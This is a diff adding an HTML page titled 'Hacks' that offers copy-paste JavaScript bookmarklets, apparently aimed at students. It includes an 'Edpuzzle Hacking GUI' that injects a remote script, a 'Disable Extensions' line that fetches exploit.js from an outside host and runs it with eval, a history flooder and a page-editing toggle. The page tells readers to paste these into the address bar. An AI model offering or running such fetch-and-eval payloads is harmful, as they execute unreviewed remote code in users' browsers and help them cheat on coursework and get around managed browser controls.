@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hacks</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <h1>Hacks</h1>
+    <h2>(Please note that you have to type in "javascript:" without the quotes in the tabs search bar that you want to hack.)</h3>
+    <ul>
+      <li>
+        <div class="list-item">
+          <div class="title">Edpuzzle Hacking GUI</div>
+          <div class="text" id="text1"> javascript: void(document.head.appendChild(document.createElement('script')).src='https://cdn.jsdelivr.net/gh/nabilubg/nabilubg.github.io@main/js/bookmarklets/edpuzzle.js')
+        </div>
+          <button onclick="copyText('text1')">Copy</button>
+        </div>
+      </li>
+      <li>
+        <div class="list-item">
+          <div class="title">History Flooder</div>
+          <div class="text" id="text2">javascript: var num=prompt('how many times do you want this page in your history?');done=false;x=window.location.href;for (var i=1; i<=num; i++){
+            history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){
+            alert('flood success! | nabilgames\n '+window.location.href+' \nis now in ur history '+num+(num==1?' time.':' times! '))}</div>
+          <button onclick="copyText('text2')">Copy</button>
+        </div>
+    </div>
+</li>
+  <div class="list-item">
+    <div class="title">Inspect Hack</div>
+    <div class="text" id="text4">  javascript:document.body.contentEditable='true'; document.designMode='on'; void 0</div>
+    <button onclick="copyText('text4')">Copy</button>
+</div>
+</li>
+</div>
+<li>
+<div class="list-item">
+  <div class="title">Disable Extensions</div>
+  <div class="text" id="text5">  javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});</div>
+  <button onclick="copyText('text5')">Copy</button>
+</div>
+</div>
+</li>
+<li>
+  <div class="list-item">
+    <div class="title">Blooket Hacking GUI</div>
+    <div class="text" id="text3">HHHHHMMMMMMMM?</div>
+    <button onclick="copyHacks()">Copy</button>
+  </div>
+  
+
+
+    <script src="index.js"></script>
+  </body>
+</html>
